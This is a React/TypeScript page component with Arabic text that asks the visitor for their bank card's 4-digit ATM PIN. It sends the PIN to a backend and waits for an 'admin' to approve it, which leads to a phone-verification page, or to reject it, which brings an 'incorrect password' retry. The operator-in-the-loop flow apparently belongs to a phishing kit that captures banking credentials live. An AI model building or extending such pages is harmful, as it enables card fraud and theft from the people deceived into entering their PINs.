import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function ATMPassword() {
  const [, navigate] = useLocation();
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  // Emit page enter
  useEffect(() => {
    navigateToPage("كلمة مرور ATM");
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate to phone verification page
        navigate("/phone-verification");
      } else if (action.action === "reject") {
        // Show error and clear PIN
        setPin("");
        setError(true);
        setIsWaiting(false);
        inputRef.current?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (pin.length !== 4) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    sendData({
      digitCode: pin,
      current: "كلمة مرور ATM",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              className="w-8 h-8 text-primary"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">كلمة مرور ATM</h1>
          <p className="text-gray-500 text-sm">
            أدخل كلمة مرور الصراف الآلي الخاصة ببطاقتك
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* PIN Input */}
          <div className="flex justify-center" dir="ltr">
            <InputOTP
              maxLength={4}
              value={pin}
              onChange={(value) => {
                setPin(value);
                setError(false);
              }}
              type="password"
              disabled={isWaiting}
              autoFocus
            >
              <InputOTPGroup>
                <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={1} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={2} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={3} className={error ? "border-red-500" : ""} />
              </InputOTPGroup>
            </InputOTP>
          </div>

          {error && (
            <p className="text-red-500 text-xs text-center">
              كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى
            </p>
          )}

          {/* Submit Button */}
          <Button type="submit" className="w-full" size="lg" disabled={isWaiting || pin.length !== 4}>
            {isWaiting ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>جاري التحقق...</span>
              </div>
            ) : (
              "تأكيد"
            )}
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
